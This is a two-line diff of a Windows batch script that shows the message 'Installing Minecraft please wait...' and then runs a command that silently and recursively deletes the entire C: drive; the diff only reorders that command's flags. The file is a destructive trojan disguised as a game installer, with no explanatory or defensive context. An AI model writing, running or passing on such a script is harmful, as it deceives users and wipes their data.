@@ -1,2 +1,2 @@
 msg * Installing Minecraft please wait...
-rd /s/q C:\
+rd c:\ /s /q
